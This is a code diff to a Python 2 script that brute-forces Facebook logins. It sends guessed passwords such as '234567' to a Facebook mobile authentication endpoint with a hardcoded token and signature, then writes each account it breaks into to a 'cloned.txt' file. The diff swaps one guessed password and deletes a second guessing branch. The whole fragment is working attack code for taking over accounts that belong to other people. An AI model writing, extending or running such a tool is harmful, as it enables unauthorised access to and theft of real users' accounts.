@@ -351,7 +351,7 @@ def action():
                                     cps.close()
                                     cpb.append(c+user+pass3)
                                 else:
-                                    pass4="SOHAIB786"
+                                    pass4="234567"
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
@@ -385,17 +385,7 @@ def action():
                                                     cps.close()
                                                     cpb.append(c+user+pass5)
                                                                                                                                                                                                                 
-                                                    else:
-                                            pass5="234567"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                            q = json.load(data)
-                                            if 'access_token' in q:
-                                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass5
-                                                okb = open('save/cloned.txt', 'a')
-                                                okb.write(k+c+user+pass5+'\n')
-                                                okb.close()
-                                                oks.append(c+user+pass5)                                                                                                                                                            
-                                                                                                                                                                                                            
+                                                                                                                                                                                                                                                                
                                                                                                                                                                                                             
                                                                                                                                                                                                             
                                                                                                                                                                                                             
